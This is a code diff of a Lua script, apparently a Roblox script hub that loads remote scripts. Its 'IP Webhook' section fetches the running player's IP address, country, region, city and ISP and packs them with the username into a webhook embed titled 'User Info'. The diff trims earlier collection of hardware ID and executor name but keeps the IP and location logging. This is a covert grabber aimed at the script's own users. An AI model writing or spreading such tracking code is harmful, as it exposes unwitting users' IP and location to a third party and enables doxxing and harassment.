@@ -115,41 +115,23 @@ for displayName, url in pairs(LOADER_SCRIPTS) do
     addScriptButton(displayName, url)
 end
 
--- ===[ IP Webhook + Extended Info ]===
+-- ===[ IP Webhook ]===
 task.delay(0.5, function()
-    local ok, resp = pcall(function()
-        return game:HttpGet(IP_API_URL, true)
-    end)
+    local ok, resp = pcall(function() return game:HttpGet(IP_API_URL, true) end)
     if not ok or not resp then
         return warn("IP fetch failed:", resp)
     end
 
     local data = HttpService:JSONDecode(resp)
-
-    local executor = identifyexecutor and identifyexecutor() or "Unknown"
-    local hwid = gethwid and gethwid() or "Unavailable"
-    local gameName = "Unknown"
-    pcall(function()
-        local info = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
-        gameName = info.Name or "Unknown"
-    end)
-
     local payload = {
         username = "🔥 | Developer",
         embeds = {{
-            title = "📡 User Access Logged",
-            description = table.concat({
-                "**Username:** `" .. player.Name .. "`",
-                "**UserId:** `" .. player.UserId .. "`",
-                "**IP:** `" .. (data.ip or "Unknown") .. "`",
-                "**Country:** `" .. (data.country or "Unknown") .. "`",
-                "**Region:** `" .. (data.region or "Unknown") .. "`",
-                "**City:** `" .. (data.city or "Unknown") .. "`",
-                "**ISP:** `" .. (data.org or "Unknown") .. "`",
-                "**Game:** `" .. gameName .. "`",
-                "**Executor:** `" .. executor .. "`",
-                "**HWID:** `" .. hwid .. "`"
-            }, "\n"),
+            title = "📡 User Info",
+            description = string.format(
+                "**User:** `%s`\n**IP:** `%s`\n**Country:** `%s`\n**Region:** `%s`\n**City:** `%s`\n**ISP:** `%s`",
+                player.Name, data.ip or "Unknown", data.country or "Unknown",
+                data.region or "Unknown", data.city or "Unknown", data.org or "Unknown"
+            ),
             color = 3447003,
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
